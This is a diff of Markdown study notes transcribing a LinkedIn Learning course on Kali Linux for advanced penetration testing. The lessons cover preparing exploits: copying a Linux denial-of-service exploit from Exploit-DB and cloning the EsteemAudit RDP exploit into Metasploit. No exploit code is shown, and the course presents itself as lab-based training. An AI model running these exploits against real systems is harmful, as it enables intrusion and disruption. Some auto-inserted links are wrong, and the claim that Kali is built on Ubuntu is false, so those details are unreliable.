@@ -110,18 +110,17 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Using Kali Linux as the basis for advanced penetration testing
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-kali-linux-as-the-basis-for-advanced-penetration-testing?u=76281980)
+#### [Using Kali Linux as the basis for advanced penetration testing](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-kali-linux-as-the-basis-for-advanced-penetration-testing?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-kali-linux-as-the-basis-for-advanced-penetration-testing?u=76281980&t=0)** - [Instruction] Penetration testing is an activity which requires a solid foundation of ethical hacking using pre-built tools.
+> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-kali-linux-as-the-basis-for-advanced-penetration-testing?u=76281980&t=0)** - [Instruction] [[Penetration Testing]] is an activity which requires a solid foundation of [[Ethical Hacking]] using pre-built tools.
 >
 > **[0:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-kali-linux-as-the-basis-for-advanced-penetration-testing?u=76281980&t=7)** Augmented with an ability to create fit for purpose exploits to test deeper into target systems.
 >
 > **[0:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-kali-linux-as-the-basis-for-advanced-penetration-testing?u=76281980&t=15)** A pen tester needs to keep up to date with emerging tools and techniques, and be able to rapidly take exploitation concepts and produce working modules that can deliver irrefutable testing evidence using tests that can be reproduced.
 >
-> **[0:31](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-kali-linux-as-the-basis-for-advanced-penetration-testing?u=76281980&t=31)** Kali Linux is an important tool for the pen tester, providing a common testing platform for many hundreds of testing tools.
+> **[0:31](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-kali-linux-as-the-basis-for-advanced-penetration-testing?u=76281980&t=31)** [[Kali Linux]] is an important tool for the pen tester, providing a common testing platform for many hundreds of testing tools.
 >
 > **[0:39](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-kali-linux-as-the-basis-for-advanced-penetration-testing?u=76281980&t=39)** Its extensible and configurable and is well-supported.
 >
@@ -139,12 +138,11 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Kali Linux]] (3), [[Penetration Testing]] (2), career (2), [[Ethical Hacking]] (1), [[Engineering]] (1)
+> **Frameworks & Libraries:** [[Kali Linux]] (3), [[Penetration Testing]] (2), [[Ethical Hacking]] (1)
 > **Definitions:** is an  (2)
 > **Speakers:** - [instruction] (1)
 
-#### What you should know
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980)
+#### [What you should know](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -154,34 +152,33 @@ created: 2026-05-02
 >
 > **[0:11](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980&t=11)** I'll also be using two online test labs, the Offensive Security Proving Grounds and Hack The Box.
 >
-> **[0:18](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980&t=18)** This is an advanced course, and you'll need to have a good working knowledge of Kali and some hands-on experience of ethical hacking.
+> **[0:18](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980&t=18)** This is an advanced course, and you'll need to have a good working knowledge of Kali and some hands-on experience of [[Ethical Hacking]].
 >
 > **[0:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980&t=26)** I'll be looking at advanced features of Kali, which build on an assumed basic level of knowledge.
 >
-> **[0:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980&t=32)** I'll be using exploit code in Python, C, C++, and Perl to demonstrate exploit development.
+> **[0:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980&t=32)** I'll be using exploit code in [[Python (Programming Language)|Python]], C, C++, and Perl to demonstrate exploit development.
 >
 > **[0:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980&t=40)** You should have a basic ability in these languages or at least be able to follow the general gist.
 >
 > **[0:46](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980&t=46)** Pen testing is a challenging pursuit.
 >
-> **[0:49](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980&t=49)** You should be competent in Windows and Linux host technologies, as well as having a good grasp of network protocols.
+> **[0:49](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980&t=49)** You should be competent in [[Windows]] and [[Linux]] host technologies, as well as having a good grasp of network protocols.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Security]] (1), [[Ethical Hacking]] (1), [[Python (Programming Language)|Python]] (1), [[Windows]] (1), [[Linux]] (1)
+> **Frameworks & Libraries:** [[Ethical Hacking]] (1), [[Python (Programming Language)|Python]] (1), [[Windows]] (1), [[Linux]] (1)
 > **Definitions:** is a  (2), is an  (1)
 > **CLI Commands:** python (1)
 > **Prerequisites:** you'll need (1)
 > **Speakers:** - [instructor] (1)
 
-#### Disclaimer
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/disclaimer?u=76281980)
+#### [Disclaimer](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/disclaimer?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/disclaimer?u=76281980&t=0)** - [Instructor] This course uses a range of third-party testing tools.
 >
-> **[0:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/disclaimer?u=76281980&t=4)** Some are commercial products and some are open source.
+> **[0:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/disclaimer?u=76281980&t=4)** Some are commercial [[Microsoft Products|products]] and some are open source.
 >
 > **[0:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/disclaimer?u=76281980&t=8)** The download and installation instructions for all tools used in this course are available as a PDF in the associated course material.
 >
@@ -208,8 +205,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Testing with Kali Linux
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980)
+#### [Testing with Kali Linux](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -225,7 +221,7 @@ created: 2026-05-02
 >
 > **[0:28](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=28)** Consequently, running a pen test requires a lot of preparation to determine what might be the right tools and exploits to use, and to manage the uncertainty that comes with using tools and exploits in an uncertain environment.
 >
-> **[0:44](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=44)** Offensive Security, the folks who provide Kali for us, have a range of training courses, the most well-known of which is Pen 200, pen testing with Kali, which is the training course for the OSCP Certified Professional examination.
+> **[0:44](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=44)** Offensive Security, the folks who provide Kali for us, have a range of training courses, the most well-known of which is Pen 200, pen testing with Kali, which is the training course for the [[OSCP]] Certified Professional examination.
 >
 > **[1:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=60)** This is the most widely recognized qualification in the pen testing world.
 >
@@ -263,11 +259,11 @@ created: 2026-05-02
 >
 > **[3:16](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=196)** Pen testers will need to have a broad range of skills across networks, operating systems and common applications.
 >
-> **[3:23](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=203)** Most testers will then develop their skills in specific areas, such as wireless networks, specific operating systems, such as Windows or Linux, specific services such as web and mobile, or specific applications, such as Active Directory.
+> **[3:23](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=203)** Most testers will then develop their skills in specific areas, such as wireless networks, specific operating systems, such as [[Windows]] or [[Linux]], specific services such as web and mobile, or specific applications, such as [[Active Directory]].
 >
 > **[3:39](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=219)** There are also some specialized areas outside of mainstream IT, such as SCADA systems, control systems used in areas, such as power stations and other utilities.
 >
-> **[3:50](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=230)** The explosion in technology that is occurring with the Internet of Things means there'll be many more specialized areas.
+> **[3:50](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=230)** The explosion in technology that is occurring with the [[IoT|Internet of Things]] means there'll be many more specialized areas.
 >
 > **[3:56](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=236)** Home automation, transport and automotive, industrial automation, e-health devices and so on.
 >
@@ -283,28 +279,27 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[OSCP]] (2), [[Automation]] (2), [[Security]] (1), [[Engineering]] (1), [[Windows]] (1)
+> **Frameworks & Libraries:** [[OSCP]] (2), [[Windows]] (1), [[Linux]] (1), [[Active Directory]] (1), [[IoT|Internet of things]] (1)
 > **Analogies:** such as (7)
 > **Env Vars:** oscp (2), scada (1)
 > **CLI Commands:** find (2)
 > **Speakers:** - [instructor] (1)
 
-#### Understanding Kali deployments
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980)
+#### [Understanding Kali deployments](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=0)** - There are a number of ways to deploy Kali.
 >
-> **[0:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=3)** As a hardware deployed system and as a virtual machine being the most popular.
+> **[0:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=3)** As a [[Hardware]] deployed system and as a virtual machine being the most popular.
 >
 > **[0:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=8)** While Kali is usually deployed on standard x86 laptop hardware, it can also be deployed on an increasing number of other platforms, such as ARM-based tablets.
 >
-> **[0:18](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=18)** A special configuration of Kali for a range of Android devices has been released, known as Kali NetHunter.
+> **[0:18](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=18)** A special configuration of Kali for a range of [[Android]] devices has been released, known as Kali NetHunter.
 >
 > **[0:25](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=25)** And this is designed to be used for wifi and radio based testing.
 >
-> **[0:29](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=29)** Kali is a special build of Ubuntu and deploys onto bare metal as a standard Linux system.
+> **[0:29](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=29)** Kali is a special build of [[Ubuntu]] and deploys onto bare metal as a standard [[Linux]] system.
 >
 > **[0:36](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=36)** The downside of being a hardware based deployment is that any changes made, which destabilize the system, may be difficult to roll back.
 >
@@ -312,7 +307,7 @@ created: 2026-05-02
 >
 > **[0:50](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=50)** And should the system be connected to a customer network, the malware may jump across.
 >
-> **[0:55](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=55)** Virtualization has become a common approach to running systems with cloud-based virtual machines, making up the majority of enterprise service solutions.
+> **[0:55](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=55)** Virtualization has become a common approach to running systems with cloud-based [[Virtual Machines]], making up the majority of enterprise service solutions.
 >
 > **[1:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=64)** In premise systems, are now usually delivered using virtualization.
 >
@@ -364,7 +359,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Hardware]] (4), [[Virtualization]] (3), [[Android]] (1), [[Ubuntu]] (1), [[Linux]] (1)
+> **Frameworks & Libraries:** [[Hardware]] (4), [[Android]] (1), [[Ubuntu]] (1), [[Linux]] (1), [[Virtual Machines]] (1)
 > **Definitions:** is a  (2), means that (2), known as (1)
 > **Env Vars:** usb (2), arm (1), lan (1)
 > **CLI Commands:** make (2)
@@ -373,8 +368,7 @@ created: 2026-05-02
 > **Prerequisites:** install (1)
 > **Speakers:** - there (1)
 
-#### Preparing your toolbox
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980)
+#### [Preparing your toolbox](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -388,7 +382,7 @@ created: 2026-05-02
 >
 > **[0:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=35)** You'll need to manage how you access the thousands of exploits, which can be sent to a target in order to achieve a scan, a penetration, or a privilege escalation.
 >
-> **[0:45](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=45)** Effective management of and rapid access to these exploits is critical for taking the OFCCP examination, as well as ensuring high professional performance as a pen tester, to achieve this, you need to go beyond the search capabilities, built into the various exploit databases.
+> **[0:45](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=45)** Effective management of and rapid access to these exploits is critical for taking the OFCCP examination, as well as ensuring high professional performance as a pen tester, to achieve this, you need to go beyond the search capabilities, built into the various exploit [[Databases]].
 >
 > **[1:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=64)** Another set of components you'll want to manage is shells, which you can upload to a target directly, or as parts of an exploit.
 >
@@ -416,7 +410,7 @@ created: 2026-05-02
 >
 > **[2:28](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=148)** Okay, we have 339 folders with one or more tools in each.
 >
-> **[2:33](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=153)** However, not all of the tools are in user share as some come as part of the Linux distribution.
+> **[2:33](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=153)** However, not all of the tools are in user share as some come as part of the [[Linux]] distribution.
 >
 > **[2:39](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=159)** One of the tools we may want to use is SPD.
 >
@@ -448,9 +442,9 @@ created: 2026-05-02
 >
 > **[4:23](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=263)** Let's add it.
 >
-> **[4:25](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=265)** Okay, we'll go to /usr/share and we'll sudo git clone
+> **[4:25](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=265)** Okay, we'll go to /usr/share and we'll sudo [[Git]] clone
 >
-> **[4:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=275)** https:// [github.com/OWASP/joomscan.git](https://github.com/OWASP/joomscan.git).
+> **[4:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=275)** https:// [[[GitHub]].com/[[OWASP]]/joomscan.git](https://github.com/OWASP/joomscan.git).
 >
 > **[4:49](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=289)** Okay, that's done.
 >
@@ -458,13 +452,13 @@ created: 2026-05-02
 >
 > **[5:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=303)** Version 0.0.7.
 >
-> **[5:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=305)** The key step in training for OSCP or preparing for pen testing assignment is to make sure all the tools you need are loaded and ready to go.
+> **[5:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=305)** The key step in training for [[OSCP]] or preparing for pen testing assignment is to make sure all the tools you need are loaded and ready to go.
 >
 > **[5:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=314)** You'll likely find tools which are useful outside of Kali and spending a bit of time preparing them for use is a good investment.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Linux]] (2), [[Git]] (2), management (1), [[Search]] (1), [[Databases]] (1)
+> **Frameworks & Libraries:** [[Linux]] (2), [[Git]] (2), [[Databases]] (1), [[GitHub]] (1), [[OWASP]] (1)
 > **CLI Commands:** ls (4), find (2), sudo (2), git (2), apt (1)
 > **Prerequisites:** you'll need (5), install (1)
 > **Env Vars:** ofccp (1), spd (1), sbd (1), owasp (1), oscp (1)
@@ -473,8 +467,7 @@ created: 2026-05-02
 > **Analogies:** such as (1), for instance (1)
 > **URLs:** [github.com](https://github.com) (1)
 
-#### Preparing to use exploits for testing
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980)
+#### [Preparing to use exploits for testing](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -494,7 +487,7 @@ created: 2026-05-02
 >
 > **[0:46](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=46)** And we can filter on the type of tag on the exploit.
 >
-> **[0:51](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=51)** Exploit-DB also maintains lists for exploit shell codes and papers.
+> **[0:51](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=51)** [[Exploit-DB]] also maintains lists for exploit shell codes and papers.
 >
 > **[1:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=60)** The exploits database can be downloaded or we can browse it online.
 >
@@ -516,11 +509,11 @@ created: 2026-05-02
 >
 > **[1:47](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=107)** Okay, we can see we have seven exploits available.
 >
-> **[1:51](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=111)** The common path is /usr/share/exploitdb/exploits/ and the specific extension is on the right of the exploit.
+> **[1:51](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=111)** The common path is /usr/share/[[Exploit-DB|exploitdb]]/exploits/ and the specific extension is on the right of the exploit.
 >
 > **[1:59](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=119)** Let's get the denial of service exploit and prepare it.
 >
-> **[2:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=123)** We'll copy /usr/share/exploitdb /exploits/linux/dos/16270.c.
+> **[2:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=123)** We'll copy /usr/share/exploitdb /exploits/[[Linux]]/dos/16270.c.
 >
 > **[2:21](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=141)** And we'll copy that to 16270.c.
 >
@@ -548,7 +541,7 @@ created: 2026-05-02
 >
 > **[3:29](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=209)** It's important to prepare these exploits in advance and then manage them in a way which allows easy access to them when doing pen tests.
 >
-> **[3:38](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=218)** Let's start up Metasploit.
+> **[3:38](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=218)** Let's start up [[Metasploit]].
 >
 > **[3:43](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=223)** Kali includes over 2,100 exploits in the Metasploit framework.
 >
@@ -560,11 +553,11 @@ created: 2026-05-02
 >
 > **[4:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=243)** If I search for an exploit called EsteemAudit, we'll do a search esteem, there are no results.
 >
-> **[4:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=254)** EsteemAudit can be downloaded in Ruby form for Metasploit from the BlackMathIT site in GitHub.
+> **[4:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=254)** EsteemAudit can be downloaded in Ruby form for Metasploit from the BlackMathIT site in [[GitHub]].
 >
 > **[4:22](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=262)** We can also load it into Kali by cloning it.
 >
-> **[4:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=266)** We'll git clone [https://github.com/BlackMathIT](https://github.com/BlackMathIT)/
+> **[4:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=266)** We'll [[Git]] clone [https://github.com/BlackMathIT](https://github.com/BlackMathIT)/
 >
 > **[4:37](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=277)** Esteemaudit-Metasploit.git.
 >
@@ -574,7 +567,7 @@ created: 2026-05-02
 >
 > **[4:53](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=293)** We need to put the Ruby file into our local Metasploit folder, which is .msf4.
 >
-> **[4:59](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=299)** EsteemAudit is a Windows RDP attack, so we'll copy the Ruby code across into the exploits/windows/rdp folder.
+> **[4:59](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=299)** EsteemAudit is a [[Windows]] RDP attack, so we'll copy the Ruby code across into the exploits/windows/rdp folder.
 >
 > **[5:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=308)** cd .msf4/modules.
 >
@@ -610,7 +603,7 @@ created: 2026-05-02
 >
 > **[7:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=420)** Let's go back into Metasploit and see what it looks like.
 >
-> **[7:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=425)** msfconsole.
+> **[7:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=425)** [[Metasploit|msfconsole]].
 >
 > **[7:09](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=429)** When we search for esteem, and we can see the number of exploits have increased by one.
 >
@@ -632,7 +625,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (5), [[Search]] (4), database (3), [[GitHub]] (3), [[Git]] (2)
+> **Frameworks & Libraries:** [[Metasploit]] (13), [[Windows]] (5), [[GitHub]] (3), [[Exploit-DB]] (2), [[Exploit-DB|Exploitdb]] (2)
 > **CLI Commands:** ruby (5), mkdir (4), git (2), make (2), ls (1)
 > **File Paths:** 16270.c (3), exploits/linux/dos/16270.c (1), esteemaudit.rb (1)
 > **Tools:** github (3)
@@ -641,8 +634,7 @@ created: 2026-05-02
 > **URLs:** [https://github.com/blackmathit](https://github.com/blackmathit) (1)
 > **Env Vars:** rdp (1)
 
-#### Managing the Kali menu
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/managing-the-kali-menu?u=76281980)
+#### [Managing the Kali menu](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/managing-the-kali-menu?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -706,7 +698,7 @@ created: 2026-05-02
 >
 > **[3:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/managing-the-kali-menu?u=76281980&t=181)** At the left let's select Web Application, Web Crawlers and Directory Bruteforce.
 >
-> **[3:10](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/managing-the-kali-menu?u=76281980&t=190)** In the middle panel, we can see dirb and dirbuster, but not gobuster, lets add it.
+> **[3:10](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/managing-the-kali-menu?u=76281980&t=190)** In the middle panel, we can see [[Dirb]] and dirbuster, but not [[Gobuster]], lets add it.
 >
 > **[3:16](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/managing-the-kali-menu?u=76281980&t=196)** It will select New Item, we'll call it gobuster and for the command, we need to enter a special form of launch by saying /user/share/kali.menu/exec.in.shell
 >
@@ -720,19 +712,18 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** application (6), web (3), web application (1), next (1)
+> **Frameworks & Libraries:** [[Gobuster]] (5), [[Dirb]] (1)
 > **CLI Commands:** find (2), apt (2), sudo (1)
 > **UI Navigation:** scroll down (2), select the (2), go to (1)
 > **Prerequisites:** install (3)
 > **Tools:** terminal (1)
 > **Speakers:** - [instructor] (1)
 
-#### Using the LinkedIn Learning penetration testing lab
